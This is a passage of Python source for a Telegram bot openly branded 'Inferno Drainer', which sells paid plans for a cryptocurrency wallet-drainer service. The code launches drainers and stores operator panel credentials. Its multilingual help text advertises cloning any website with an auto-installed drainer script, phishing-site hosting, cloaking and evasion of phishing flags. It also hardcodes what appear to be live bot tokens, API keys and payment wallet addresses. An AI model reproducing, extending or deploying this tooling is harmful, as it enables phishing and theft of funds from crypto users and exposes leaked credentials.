        })
        return jsonify({"status": "success", "message": f"Drainer launched for {target}"})
    except Exception as e:
        logger.error(f"Error launching drainer: {e}")
        return jsonify({"status": "error", "message": "Failed to launch drainer"}), 500


# ─── Credential Storage / Verification (unchanged logic) ───────────────────

def store_credentials(panel_id: str, password: str, user_id: int) -> bool:
    """Store hashed credentials in database and reset their active status."""
    try:
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        created_at = datetime.now(timezone.utc).isoformat(sep=' ')
        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("""
                INSERT OR REPLACE INTO credentials
                    (panel_id, user_id, password_hash, created_at, active, revoked_at)
                VALUES (?, ?, ?, ?, 1, NULL)
            """, (panel_id, user_id, password_hash, created_at))
            conn.commit()
            logger.info(f"Credentials stored for panel_id: {panel_id}, user_id: {user_id}")
            export_credentials_to_json()
            return True
    except Exception as e:
        logger.error(f"Error storing credentials: {e}")
        return False


def export_credentials_to_json():
    """Export all credentials from database to Web/credentials.json and credentials.js."""
    try:
        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT panel_id, user_id, password_hash FROM credentials")
            results = cursor.fetchall()
            credentials = [{"panel_id": row[0], "user_id": row[1], "password_hash": row[2]} for row in results]

        script_dir = Path(__file__).resolve().parent

        credentials_file = script_dir / 'Web' / 'credentials.json'
        credentials_file.parent.mkdir(parents=True, exist_ok=True)
        with credentials_file.open('w', encoding='utf-8') as f:
            json.dump({"credentials": credentials}, f, indent=2)

        credentials_js_file = script_dir / 'Web' / 'credentials.js'
        with credentials_js_file.open('w', encoding='utf-8') as f:
            f.write('window.credentialsData = ')
            json.dump({"credentials": credentials}, f, indent=2)
            f.write(';')

        logger.info(f"Exported {len(credentials)} credentials to {credentials_file} and {credentials_js_file}")
    except Exception as e:
        logger.error(f"Error exporting credentials: {e}")


def verify_credentials(panel_id: str, password: str) -> bool:
    """Verify credentials against database and ensure the panel is active."""
    try:
        if not is_valid_panel_id(panel_id):
            return False

        password_hash = hashlib.sha256(password.encode()).hexdigest()
        with safe_db_connection() as conn:
            cursor = conn.cursor()
            cursor.execute(
                "SELECT password_hash, active, revoked_at FROM credentials WHERE panel_id = ?", (panel_id,)
            )
            result = cursor.fetchone()
            if not result:
                logger.warning(f"Login failed for panel_id: {panel_id} - panel not found")
                return False

            stored_hash, active, revoked_at = result
            if not active or revoked_at is not None:
                logger.warning(f"Login rejected for panel_id: {panel_id} - inactive or revoked")
                return False

            if stored_hash != password_hash:
                logger.warning(f"Login failed for panel_id: {panel_id} - bad password")
                return False

            logger.info(f"Login successful for panel_id: {panel_id}")
            return True
    except Exception as e:
        logger.error(f"Error verifying credentials: {e}")
        return False

# Add these new variables at the top with other declarations
load_dotenv()  # Load environment variables from .env file

# 🔧 Configuration Management - Load from environment variables
def get_config(key: str, default: str = None) -> str:
    """Load configuration from environment variables with optional defaults."""
    value = os.getenv(key)
    if value is None:
        if default is None:
            logger.warning(f"⚠️ Missing environment variable: {key}")
        return default
    return value

# 🔑 Core Configuration - Load from .env file or use defaults
BOT_TOKEN = get_config('TELEGRAM_BOT_TOKEN', '7834224349:AAGwfsUecVS3jDj8YsIWB4hmSGLiql0txeQ')
ALCHEMY_URL = get_config('ALCHEMY_URL', 'https://eth-mainnet.g.alchemy.com/v2/g_yjUgaMgUWyyURqH5llzICU151WjZxu')
CRYPTOCOMPARE_API_KEY = get_config('CRYPTOCOMPARE_API_KEY', '10ede356b29044d2710c9948a31e5f641b065052a10947642b8c5ddf993518ca')
NOWNODES_API_KEY = get_config('NOWNODES_API_KEY', 'dde550c3-19a8-4061-b7ec-34f6035352cf')

# 💰 Wallet Addresses - Load from environment variables
BTC_WALLET = get_config('BTC_WALLET_ADDRESS', 'bc1qnkj8ax5aqr4q5ka5ahr0lxvszvkz8a7f8vplum')
ETH_WALLET = get_config('ETH_WALLET_ADDRESS', '0xfe98de7a7bad9e2dd98f4e0099c9583f96a1693f')
USDT_WALLET = get_config('USDT_WALLET_ADDRESS', 'THmBDjaqDi3kN5MPNepJbhnvhg51XeKoeh')

# 🌐 URLs and Service Configuration
DRAINER_URL = get_config('DRAINER_URL', 'https://angelinferno.xo.je/')
if DRAINER_URL and 'ct.ws' in DRAINER_URL:
    DRAINER_URL = 'https://angelinferno.xo.je/'
BACKUP_BOT = get_config('BACKUP_BOT_URL', 'https://t.me/bwefuiwehfgiuhwefgi_bot')

# 💾 Database Configuration
DB_FILE = get_config('DATABASE_PATH', 'wallets.db')

active_payments = {}  # Track active payment tasks: {user_id: asyncio.Task}
pending_payments = {}
panel_interaction_flags = {}
user_wake_expiry = {}  # Wake access expiry times for /info
user_last_activity = {}  # Last user activity timestamp for inactivity checks
REMINDER_INTERVAL = 300  # seconds (5 minutes)
PAYMENT_TIMEOUT = 3600  # 1 hour (3600 seconds)
USDT_CONTRACT_ADDRESS = get_config('USDT_CONTRACT_ADDRESS', 'THr3i438FUh8oD92MmMr9FsT6mxxorEbyY')
BTC_CONTRACT_ADDRESS = get_config('BTC_CONTRACT_ADDRESS', 'bc1q9y5ahgu433cn2sfph0evwa25uyyzpuq5u9azs0')
ETH_CONTRACT_ADDRESS = get_config('ETH_CONTRACT_ADDRESS', '0x6152c0Bf0Cf572808C0f33721131667556dAE728') 

# 🚀 Connect to Ethereum via Alchemy
web3 = Web3(Web3.HTTPProvider(ALCHEMY_URL))
if web3.is_connected():
    logger.info("✅ Connected to Ethereum via Alchemy")
else:
    logger.error("❌ Failed to connect to Ethereum via Alchemy")

# 🎯 Generate a BIP39-compliant seed phrase
def generate_seed_phrase():
    mnemo = Mnemonic("english")
    return mnemo.generate(strength=256)  # 24-word seed phrase
seed_phrase = generate_seed_phrase()
if not seed_phrase:
    # Fallback to a default value if generation fails
    seed_phrase = "N/A"

# 🎯 Generate a new Ethereum wallet
def generate_ethereum_wallet():
    entropy = os.urandom(32)
    account = Account.create(entropy)
    private_key = account.key.hex()
    address = Web3.to_checksum_address(account.address)
    return private_key, address

# 🎯 Comprehensive Ethereum address validation
def validate_ethereum_address_comprehensive(address: str) -> tuple[bool, str]:
    """
    Production-grade comprehensive Ethereum address validation (EIP-55 compliant).
    
    Returns:
        tuple: (is_valid: bool, error_message: str)
    
    Validates:
    - Basic format (0x prefix, length)
    - Hexadecimal characters
    - EIP-55 checksum (if checksummed)
    - Not null/zero address
    - Not burn/dead address
    """
    if not address:
        return False, "Address cannot be empty"
    
    # Remove any whitespace
    address = address.strip()
    
    # Check basic format - must start with 0x
    if not address.startswith('0x') and not address.startswith('0X'):
        return False, "Address must start with '0x'"
    
    # Normalize case for length check
    addr_no_prefix = address[2:]
    
    # Check length (0x + 40 hex chars = 42 total)
    if len(address) != 42:
        return False, f"Address must be exactly 42 characters long (0x + 40 hex characters), got {len(address)}"
    
    # Check if all characters after 0x are valid hex
    try:
        int(addr_no_prefix, 16)
    except ValueError:
        return False, "Address contains invalid hexadecimal characters"
    
    # Use web3's built-in validation
    try:
        if not web3.is_address(address):
            return False, "Invalid Ethereum address format"
    except Exception as e:
        return False, f"Address validation error: {str(e)}"
    
    # Check for known invalid addresses (null and burn addresses)
    address_lower = address.lower()
    null_address = '0x0000000000000000000000000000000000000000'
    burn_address = '0x000000000000000000000000000000000000dead'
    
    if address_lower == null_address:
        return False, "Null address (all zeros) is not allowed"
    
    if address_lower == burn_address:
        return False, "Burn/dead address is not allowed"
    
    # EIP-55 checksum validation (production-grade)
    try:
        # Check if address contains mixed case (indicates checksummed)
        has_lowercase = any(c.islower() for c in addr_no_prefix)
        has_uppercase = any(c.isupper() for c in addr_no_prefix)
        
        if has_lowercase and has_uppercase:
            # Address is checksummed - validate the checksum
            checksum_addr = web3.to_checksum_address(address)
            if checksum_addr != address:
                return False, f"Invalid checksum. Correct format: {checksum_addr}"
        elif has_uppercase and not has_lowercase:
            # All uppercase - not checksummed, but valid
            logger.debug(f"Address is all uppercase (not checksummed): {address}")
        elif has_lowercase and not has_uppercase:
            # All lowercase - not checksummed, but valid
            logger.debug(f"Address is all lowercase (not checksummed): {address}")
    except Exception as e:
        return False, f"Checksum validation error: {str(e)}"
    
    # Additional production checks: verify it's not all zeros or all same character
    if addr_no_prefix == '0' * 40:
        return False, "Address cannot be all zeros"
    
    if len(set(addr_no_prefix)) == 1:
        return False, "Address cannot contain only repeated characters"
    
    return True, "Valid Ethereum address"

# 🎯 Validate Ethereum address (not used in the current flow, but available for future use)
def is_valid_ethereum_address(address):
    return web3.is_address(address)

# 🚀 Handle Ethereum wallet creation
# Add this function to generate panel IDs
def generate_panel_id():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=24))
SETUP, PLAN_SELECTION, PAYMENT_METHOD, FINISH_SETUP, WALLET_INPUT, FEE_CONFIRMATION, USE_EXISTING_WALLET, VERIFY_WALLET, PAYMENT, PAYMENT_VERIFICATION = range(10)

# Fixed ETH amounts for each plan
EMERALD_PLAN_ETH = 0.25  # 0.25 ETH for Emerald Plan
DIAMOND_PLAN_ETH = 1.25  # 1.25 ETH for Diamond Plan

CRYPTOCOMPARE_API_URL = "https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=BTC,USDT"

def get_live_price(from_currency: str, to_currency: str) -> float:
    """
    Fetch the live conversion rate between two cryptocurrencies using CryptoCompare API.

    Example:
    >>> get_live_price("ETH", "USDT")
    1897.23
    """
    params = {
        "fsym": from_currency,  # From currency (e.g., BTC, ETH, USDT)
        "tsyms": to_currency,   # To currency (e.g., ETH, USD)
        "api_key": CRYPTOCOMPARE_API_KEY
    }
    try:
        response = requests.get(CRYPTOCOMPARE_API_URL, params=params, timeout=10)
        response.raise_for_status()  # Raise an error for bad responses (4xx, 5xx)
        data = response.json()

        # Log the API response for debugging
        logger.debug(f"API response for {from_currency} to {to_currency}: {data}")
        
        # Check if the expected currency is in the response
        if to_currency not in data:
            raise ValueError(f"Currency {to_currency} not found in API response")
        
        return data[to_currency]
    except requests.exceptions.RequestException as e:
        logger.error(f"Failed to fetch live price: {e}")
        raise ValueError(f"Unable to fetch live price for {from_currency} to {to_currency}")

@lru_cache(maxsize=None)  # Replace @cached with this
def get_btc_in_eth() -> float:
    API_KEY = "10ede356b29044d2710c9948a31e5f641b065052a10947642b8c5ddf993518ca"
    url = f"https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=ETH&api_key={API_KEY}"
    response = requests.get(url)
    data = response.json()
    if "ETH" not in data:
        raise ValueError(f"BTC to ETH rate not found: {data}")
    return data["ETH"]

@lru_cache(maxsize=None)  # Replace @cached with this
def get_usdt_in_eth() -> float:
    API_KEY = "10ede356b29044d2710c9948a31e5f641b065052a10947642b8c5ddf993518ca"
    url = f"https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USDT&api_key={API_KEY}"
    response = requests.get(url)
    data = response.json()
    if "USDT" not in data:
        raise ValueError(f"ETH to USDT rate not found: {data}")
    return data["USDT"]

def calculate_fees_in_btc_and_usdt(eth_fee: float) -> dict:
    """
    Convert an ETH fee to its equivalent amounts in BTC and USDT.

    Args:
        eth_fee (float): The fee amount in ETH.

    Returns:
        dict: A dictionary containing the equivalent amounts in BTC and USDT.
    """
    try:
        # Fetch live conversion rates
        eth_to_btc_rate = get_btc_in_eth()  # 1 BTC = X ETH
        eth_to_usdt_rate = get_usdt_in_eth()  # 1 ETH = X USDT

        # Calculate equivalent amounts
        btc_fee = eth_fee / eth_to_btc_rate  # ETH to BTC conversion
        usdt_fee = eth_fee * eth_to_usdt_rate  # ETH to USDT conversion

        return {
            "btc": btc_fee,
            "usdt": usdt_fee
        }
    except ValueError as e:
        logger.error(f"Failed to calculate fees: {e}")
        return {"btc": 0, "usdt": 0}  # Fallback values

def get_wallet_address(currency: str) -> str:
    """
    Retrieve the wallet address for the selected currency from environment variables.
    """
    wallet_addresses = {
        "btc": BTC_WALLET,
        "eth": ETH_WALLET,
        "usdt": USDT_WALLET,
    }
    return wallet_addresses.get(currency, None)

def calculate_equivalent_amounts(eth_amount: float) -> dict:
    """
    Convert an ETH amount to its equivalent amounts in BTC and USDT.

    Args:
        eth_amount (float): The amount in ETH.

    Returns:
        dict: A dictionary containing the equivalent amounts in BTC and USDT.
    """
    try:
        # Fetch live conversion rates
        eth_to_btc_rate = get_btc_in_eth()  # 1 BTC = X ETH
        eth_to_usdt_rate = get_usdt_in_eth()  # 1 ETH = X USDT

        # Calculate equivalent amounts
        btc_amount = eth_amount / eth_to_btc_rate  # ETH to BTC conversion
        usdt_amount = eth_amount * eth_to_usdt_rate  # ETH to USDT conversion

        return {
            "btc": btc_amount,
            "usdt": usdt_amount
        }
    except ValueError as e:
        logger.error(f"Failed to calculate equivalent amounts: {e}")
        return {"btc": 0, "usdt": 0}  # Fallback values

# Plans dictionary for payment setup
PLANS = {
    "emerald": {
        "name": "Emerald Plan",
        "fee_eth": 0.25,
        "description": "- Lightweight entry plan\nBest for smaller operations",
        "button_text": "Complete Setup Fee - 0.25 ETH",
    },
    "ruby": {
        "name": "Ruby Plan",
        "fee_eth": 0.5,
        "description": "- Balanced option\nModerate fee with reliable performance",
        "button_text": "Complete Setup Fee - 0.5 ETH",
    },
    "sapphire": {
        "name": "Sapphire Plan",
        "fee_eth": 0.7,
        "description": "- Premium mid-tier plan\nGreat for frequent use",
        "button_text": "Complete Setup Fee - 0.7 ETH",
    },
    "diamond": {
        "name": "Diamond Plan",
        "fee_eth": 1.25,
        "description": "- Elite plan\nMaximum capacity with priority handling",
        "button_text": "Complete Setup Fee - 1.25 ETH",
    },
}

DEFAULT_LANGUAGE = "en"
SUPPORTED_LANGUAGES = {
    "en": {
        "label": "English",
        "aliases": {"en", "eng", "english"},
    },
    "ru": {
        "label": "Русский",
        "aliases": {"ru", "rus", "russian", "русский"},
    },
    "zh": {
        "label": "中文",
        "aliases": {"zh", "cn", "chi", "chinese", "中文", "中国"},
    },
}
LANGUAGE_ALIASES = {
    alias: code
    for code, language_data in SUPPORTED_LANGUAGES.items()
    for alias in language_data["aliases"]
}

LANGUAGE_MESSAGES = {
    "en": {
        "language_prompt": (
            "🌐 Choose your language.\n\n"
            "Current language: {language}\n\n"
            "You can also type /lang en, /lang ru, or /lang zh."
        ),
        "language_changed": "✅ Language changed to {language}.",
        "language_invalid": "⚠️ Unsupported language. Use /lang en, /lang ru, or /lang zh.",
        "help": (
            "🩸 Inferno Drainer Bot Help 🩸\n\n"
            "Here are the available commands:\n\n"
            "💠 Setup and Wallet Commands:\n\n"
            "- /start: Start the bot and create a new wallet.\n"
            "- /new_ethereum_wallet: Generate a new Ethereum wallet.\n"
            "- /view_seeds: View saved wallet seed phrases.\n"
            "- /set_up: Set up a new Inferno account.\n"
            "- /panel: Access your Inferno panel.\n"
            "- /lang: Change bot language.\n\n"
            "💠 Payment and Plans:\n\n"
            "- /cancel: Cancel the current setup process.\n\n"
            "💠 Features and Support:\n\n"
            "- /features: List of all available features.\n"
            "- /faq: Frequently asked questions.\n"
            "- /help: Show this help message.\n\n"
            "Need help? Contact @angelinfernox 🤝📩\n\n"
        ),
        "unknown_ethereum": (
            "It looks like you sent an Ethereum wallet address without any setup context. "
            "Please use /set_up to start wallet setup."
        ),
        "unknown_non_ethereum": (
            "It looks like you sent a wallet address that is not an Ethereum address. "
            "Please use /new_ethereum_wallet to create a new Ethereum wallet first."
        ),
        "unknown_default": "I didn't quite understand that. Please try /help for a list of all commands.",
        "setup_required": (
            "❌ Your Inferno panel is not set up! \n"
            "Please login to your /panel or /set_up a new panel account to continue."
        ),
        "features_intro": "🩸Inferno – More than just a drainer",
        "features_wait": "⏳Please wait...",
        "features_full": (
            "🖤Inferno Drainer features🖤\n\n"
            "- /id:  Find out your Telegram ID.\n"
            "- /faq: 📘 Frequently Asked Questions\n"
            "- /set_up: 💎 Set up a new Inferno account.\n"
            "- /panel: 🔐 Open the Inferno panel login link\n\n"
            "Host Website with Inferno:\n"
            "- /host: 🌐 Host a new website with Inferno\n"
            "- /clone: 🕸️ Copy any site, with tools to customize and save.\n"
            "- /angelclone: 🕸️ Copy any site & install drainer script automatically\n"
            "- /landing_page: 📥 Download\n"
            "- /site_templates 🌐 List of ready website templates\n"
            "- /angelupdate: 🔄 Update your angel hosted site with the latest drainer.\n"
            "- /update: 🔄 Update your site's content at /yourdomain.com.\n"
            "- /delete: 🗑️ Remove your website.\n"
            "- /purgecache: 🚀 Speed up your site by clearing cache.\n\n"
            "Redirect Features:\n"
            "- /sites: 📋 View hosted and deleted domains.\n"
            "- /redirect: ↪️ Redirect domain 1 to domain 2.\n"
            "- /cfredirect: ↪️ Redirect domain 1 to domain 2 using Cloudflare.\n"
            "- /deletecfredirect: Remove the Cloudflare redirect.\n"
            "- /whitepage: 🗒️ Get a zip with a whitepage for hosting.\n\n"
            "IPFS Hosting:\n"
            "- /ipfshost: 📤 Host your website under pages.dev domain.\n"
            "- /ipfsupdate: 🔄 Update your site's content at /yourdomain.pages.dev.\n"
            "- /ipfsdelete: 🗑️ Remove your IPFS website.\n"
            "- /ipfslist: View hosted IPFS sites.\n\n"
            "Traffic and Security:\n"
            "- /trafic: 🚦 Check visitor stats for your domain.\n"
            "- /antiddos: 🛡️ Turn on Anti-DDoS for strong protection.\n"
            "- /disableantiddos: 🔓 Turn off Anti-DDoS.\n"
            "- /antibot: 🤖 Protect your site with Anti-Bot measures.\n"
            "- /cfstatus: 📊 View your website's Cloudflare status.\n"
            "- /enable_auto_check: 🔔 Enable automatic checks for phishing flags.\n"
            "- /disable_auto_check: 🔕 Turn off automatic checks for phishing flags.\n"
            "- /check_flagged: 🚩 Check if your site is flagged.\n\n"
            "Domain Management:\n"
            "- /check_domain: 🔍 Check domain availability.\n"
            "- /domain_price: 💰 View current domain prices.\n"
            "- /topup: ➕ Add funds to your account (ETH accepted).\n"
            "- /balance: 💼 Check your account balance.\n"
            "- /buydomain: 🛍️ Buy a new domain.\n"
            "- /mypurchases: 📜 View your domain purchases.\n"
            "- /changens: 🔄 Change domain nameservers.\n\n"
            "Need help? Contact @angelinfernox 🤝📩\n\n"
        ),
    },
    "ru": {
        "language_prompt": (
            "🌐 Выберите язык.\n\n"
            "Текущий язык: {language}\n\n"
            "Также можно написать /lang en, /lang ru или /lang zh."
        ),
        "language_changed": "✅ Язык изменен на {language}.",
        "language_invalid": "⚠️ Язык не поддерживается. Используйте /lang en, /lang ru или /lang zh.",
        "help": (
            "🩸 Помощь по Inferno Drainer Bot 🩸\n\n"
            "Доступные команды:\n\n"
            "💠 Настройка и кошелек:\n\n"
            "- /start: Запустить бота и создать новый кошелек.\n"
            "- /new_ethereum_wallet: Создать новый Ethereum-кошелек.\n"
            "- /view_seeds: Посмотреть сохраненные seed-фразы.\n"
            "- /set_up: Настроить новый аккаунт Inferno.\n"
            "- /panel: Открыть панель Inferno.\n"
            "- /lang: Изменить язык бота.\n\n"
            "💠 Платежи и планы:\n\n"
            "- /cancel: Отменить текущую настройку.\n\n"
            "💠 Функции и поддержка:\n\n"
            "- /features: Список всех доступных функций.\n"
            "- /faq: Часто задаваемые вопросы.\n"
            "- /help: Показать это сообщение.\n\n"
            "Нужна помощь? Напишите @angelinfernox 🤝📩\n\n"
        ),
        "unknown_ethereum": (
            "Похоже, вы отправили Ethereum-адрес без активной настройки. "
            "Используйте /set_up, чтобы начать настройку кошелька."
        ),
        "unknown_non_ethereum": (
            "Похоже, вы отправили адрес кошелька, который не является Ethereum-адресом. "
            "Сначала используйте /new_ethereum_wallet, чтобы создать Ethereum-кошелек."
        ),
        "unknown_default": "Я не совсем понял сообщение. Используйте /help, чтобы увидеть список команд.",
        "setup_required": (
            "❌ Ваша панель Inferno еще не настроена! \n"
            "Войдите в /panel или используйте /set_up, чтобы создать новый аккаунт панели."
        ),
        "features_intro": "🩸Inferno — больше, чем просто drainer",
        "features_wait": "⏳Пожалуйста, подождите...",
        "features_full": (
            "🖤Функции Inferno Drainer🖤\n\n"
            "- /id: Узнать ваш Telegram ID.\n"
            "- /faq: 📘 Часто задаваемые вопросы\n"
            "- /set_up: 💎 Настроить новый аккаунт Inferno.\n"
            "- /panel: 🔐 Открыть ссылку входа в панель Inferno\n\n"
            "Хостинг сайтов через Inferno:\n"
            "- /host: 🌐 Разместить новый сайт через Inferno\n"
            "- /clone: 🕸️ Скопировать сайт с инструментами настройки и сохранения.\n"
            "- /angelclone: 🕸️ Скопировать сайт и автоматически установить drainer-скрипт\n"
            "- /landing_page: 📥 Скачать\n"
            "- /site_templates 🌐 Список готовых шаблонов сайтов\n"
            "- /angelupdate: 🔄 Обновить angel-сайт последним drainer-скриптом.\n"
            "- /update: 🔄 Обновить содержимое сайта на /yourdomain.com.\n"
            "- /delete: 🗑️ Удалить сайт.\n"
            "- /purgecache: 🚀 Очистить кэш сайта.\n\n"
            "Редиректы:\n"
            "- /sites: 📋 Посмотреть размещенные и удаленные домены.\n"
            "- /redirect: ↪️ Перенаправить домен 1 на домен 2.\n"
            "- /cfredirect: ↪️ Перенаправить домен 1 на домен 2 через Cloudflare.\n"
            "- /deletecfredirect: Удалить Cloudflare-редирект.\n"
            "- /whitepage: 🗒️ Получить zip с whitepage для хостинга.\n\n"
            "IPFS-хостинг:\n"
            "- /ipfshost: 📤 Разместить сайт под доменом pages.dev.\n"
            "- /ipfsupdate: 🔄 Обновить содержимое сайта на /yourdomain.pages.dev.\n"
            "- /ipfsdelete: 🗑️ Удалить IPFS-сайт.\n"
            "- /ipfslist: Посмотреть IPFS-сайты.\n\n"
            "Трафик и безопасность:\n"
            "- /trafic: 🚦 Проверить статистику посетителей домена.\n"
            "- /antiddos: 🛡️ Включить Anti-DDoS защиту.\n"
            "- /disableantiddos: 🔓 Отключить Anti-DDoS.\n"
            "- /antibot: 🤖 Включить Anti-Bot защиту.\n"
            "- /cfstatus: 📊 Посмотреть статус Cloudflare для сайта.\n"
            "- /enable_auto_check: 🔔 Включить автоматические проверки флагов.\n"
            "- /disable_auto_check: 🔕 Отключить автоматические проверки флагов.\n"
            "- /check_flagged: 🚩 Проверить, помечен ли сайт.\n\n"
            "Управление доменами:\n"
            "- /check_domain: 🔍 Проверить доступность домена.\n"
            "- /domain_price: 💰 Посмотреть текущие цены доменов.\n"
            "- /topup: ➕ Пополнить баланс аккаунта (принимается ETH).\n"
            "- /balance: 💼 Проверить баланс аккаунта.\n"
            "- /buydomain: 🛍️ Купить новый домен.\n"
            "- /mypurchases: 📜 Посмотреть покупки доменов.\n"
            "- /changens: 🔄 Изменить nameserver домена.\n\n"
            "Нужна помощь? Напишите @angelinfernox 🤝📩\n\n"
        ),
    },
    "zh": {
        "language_prompt": (
            "🌐 请选择语言。\n\n"
            "当前语言：{language}\n\n"
            "你也可以输入 /lang en、/lang ru 或 /lang zh。"
        ),
        "language_changed": "✅ 语言已切换为 {language}。",
        "language_invalid": "⚠️ 不支持该语言。请使用 /lang en、/lang ru 或 /lang zh。",
        "help": (
            "🩸 Inferno Drainer Bot 帮助 🩸\n\n"
            "可用命令：\n\n"
            "💠 设置和钱包命令：\n\n"
            "- /start: 启动机器人并创建新钱包。\n"
            "- /new_ethereum_wallet: 生成新的 Ethereum 钱包。\n"
            "- /view_seeds: 查看已保存的钱包 seed phrase。\n"
            "- /set_up: 设置新的 Inferno 账户。\n"
            "- /panel: 打开 Inferno 面板。\n"
            "- /lang: 更改机器人语言。\n\n"
            "💠 付款和套餐：\n\n"
            "- /cancel: 取消当前设置流程。\n\n"
            "💠 功能和支持：\n\n"
            "- /features: 查看所有可用功能。\n"
            "- /faq: 常见问题。\n"
            "- /help: 显示此帮助消息。\n\n"
            "需要帮助？联系 @angelinfernox 🤝📩\n\n"
        ),
        "unknown_ethereum": (
            "你似乎发送了一个 Ethereum 钱包地址，但当前没有设置上下文。"
            "请使用 /set_up 开始钱包设置。"
        ),
        "unknown_non_ethereum": (
            "你似乎发送了一个非 Ethereum 钱包地址。"
            "请先使用 /new_ethereum_wallet 创建新的 Ethereum 钱包。"
        ),
        "unknown_default": "我没有完全理解。请使用 /help 查看所有命令。",
        "setup_required": (
            "❌ 你的 Inferno 面板尚未设置！\n"
            "请登录 /panel，或使用 /set_up 创建新的面板账户。"
        ),
        "features_intro": "🩸Inferno - 不只是 drainer",
        "features_wait": "⏳请稍候...",
        "features_full": (
            "🖤Inferno Drainer 功能🖤\n\n"
            "- /id: 查看你的 Telegram ID。\n"
            "- /faq: 📘 常见问题\n"
            "- /set_up: 💎 设置新的 Inferno 账户。\n"
            "- /panel: 🔐 打开 Inferno 面板登录链接\n\n"
            "使用 Inferno 托管网站：\n"
            "- /host: 🌐 使用 Inferno 托管新网站\n"
            "- /clone: 🕸️ 复制任意网站，并提供自定义和保存工具。\n"
            "- /angelclone: 🕸️ 复制网站并自动安装 drainer 脚本\n"
            "- /landing_page: 📥 下载\n"
            "- /site_templates 🌐 查看现成网站模板\n"
            "- /angelupdate: 🔄 用最新 drainer 更新你的 angel 托管站点。\n"
            "- /update: 🔄 更新 /yourdomain.com 上的网站内容。\n"
            "- /delete: 🗑️ 删除网站。\n"
            "- /purgecache: 🚀 清除缓存以加速网站。\n\n"
            "重定向功能：\n"
            "- /sites: 📋 查看已托管和已删除的域名。\n"
            "- /redirect: ↪️ 将域名 1 重定向到域名 2。\n"
            "- /cfredirect: ↪️ 使用 Cloudflare 将域名 1 重定向到域名 2。\n"
            "- /deletecfredirect: 删除 Cloudflare 重定向。\n"
            "- /whitepage: 🗒️ 获取用于托管的 whitepage zip 文件。\n\n"
            "IPFS 托管：\n"
            "- /ipfshost: 📤 在 pages.dev 域名下托管网站。\n"
            "- /ipfsupdate: 🔄 更新 /yourdomain.pages.dev 的网站内容。\n"
            "- /ipfsdelete: 🗑️ 删除 IPFS 网站。\n"
            "- /ipfslist: 查看 IPFS 网站。\n\n"
            "流量和安全：\n"
            "- /trafic: 🚦 查看域名访问统计。\n"
            "- /antiddos: 🛡️ 开启 Anti-DDoS 保护。\n"
            "- /disableantiddos: 🔓 关闭 Anti-DDoS。\n"
            "- /antibot: 🤖 开启 Anti-Bot 保护。\n"
            "- /cfstatus: 📊 查看网站 Cloudflare 状态。\n"
            "- /enable_auto_check: 🔔 开启自动风险标记检查。\n"
            "- /disable_auto_check: 🔕 关闭自动风险标记检查。\n"
            "- /check_flagged: 🚩 检查网站是否被标记。\n\n"
            "域名管理：\n"
            "- /check_domain: 🔍 检查域名是否可用。\n"
            "- /domain_price: 💰 查看当前域名价格。\n"
            "- /topup: ➕ 为账户充值（接受 ETH）。\n"
            "- /balance: 💼 查看账户余额。\n"
            "- /buydomain: 🛍️ 购买新域名。\n"
            "- /mypurchases: 📜 查看域名购买记录。\n"
            "- /changens: 🔄 更改域名 nameserver。\n\n"
            "需要帮助？联系 @angelinfernox 🤝📩\n\n"
        ),
    },
}

LANGUAGE_MESSAGES["en"].update({
    "group_command_restricted": (
        "🔒 <b>Private Chat Only</b>\n\n"
        "This command is only available in our private chat for security and privacy reasons.\n\n"
        "Click the button below to continue in private chat."
    ),
    "verification_first": "⚠️ Please complete wallet verification first!",
    "proceed_to_plans_button": "Proceed to Plans",
    "setup_create_wallet_button": "🆕 Create new Ethereum wallet",
    "setup_existing_wallet_button": "♻️ Use existing Ethereum wallet",
    "setup_features_button": "📋 Inferno Features",
    "setup_menu": (
        "💎 Ethereum Wallet Setup\n\n"
        "Choose how you'd like to set up your wallet:\n\n"
        "🆕 Create a new wallet: Generate a brand new Ethereum wallet with a seed phrase\n\n"
        "♻️ Use existing: Import an address from your own wallet\n\n"
        "All assets will be converted and sent to your Ethereum wallet address."
    ),
    "setup_fee": (
        "☑️ One-Time Setup Fee Required\n\n"
        "This fee helps maintain service quality and prevent abuse.\n"
        "Accepted currencies:\n"
        "- ₿ Bitcoin (BTC)\n"
        "- 💎 Ethereum (ETH)\n"
        "- 💲 Tether (USDT TRC-20)"
    ),
    "plan_emerald_name": "Emerald Plan",
    "plan_emerald_description": "- Lightweight entry plan\nBest for smaller operations",
    "plan_emerald_button": "Complete Setup Fee - 0.25 ETH",
    "plan_ruby_name": "Ruby Plan",
    "plan_ruby_description": "- Balanced option\nModerate fee with reliable performance",
    "plan_ruby_button": "Complete Setup Fee - 0.5 ETH",
    "plan_sapphire_name": "Sapphire Plan",
    "plan_sapphire_description": "- Premium mid-tier plan\nGreat for frequent use",
    "plan_sapphire_button": "Complete Setup Fee - 0.7 ETH",
    "plan_diamond_name": "Diamond Plan",
    "plan_diamond_description": "- Elite plan\nMaximum capacity with priority handling",
    "plan_diamond_button": "Complete Setup Fee - 1.25 ETH",
    "plans_list_item": (
        "🩸 *{plan_name}*\n"
        "- Cost: `{fee_eth} ETH`\n"
        "- Equivalent: `{btc_amount} BTC` or `{usdt_amount} USDT`\n\n"
    ),
    "plans_message": "📋 *Available Plans:*\n\n{plans}Please select a plan to proceed:",
    "plan_details_message": "[🩸 {plan_name} - Instant Access:]\n{description}",
    "choose_payment_method": "☑️ Choose payment method\n\nSelect your preferred payment option:",
    "invalid_payment_selection": "❌ Invalid payment selection.",
    "invalid_plan_selected": "❌ Invalid plan selected.",
    "unable_fetch_rates": "⚠️ Unable to fetch live conversion rates. Please try later.",
    "invalid_currency_selected": "❌ Invalid currency selected.",
    "payment_config_error": "❌ Payment configuration error. Please try later.",
    "network_btc": "BTC network",
    "network_eth": "ETH network",
    "network_usdt": "TRC-20 network",
    "network_unknown": "Unknown Network",
    "payment_instructions": (
        "🤝 Please send exactly: `{amount_info}`\n\n"
        "📍 Network: *{network}*\n\n"
        "📩 Generated Wallet Address: `{wallet_address}`\n\n"
        "⏰ You have 1 hour maximum to make this payment. After 1 hour, all funds sent will be lost forever!\n\n"
        "👀 If you sent under the amount, please send another transaction to bring the balance to the exact amount requested (or above) within the same hour.\n\n"
        "❤️ Ensure to cover gas fees in your transaction."
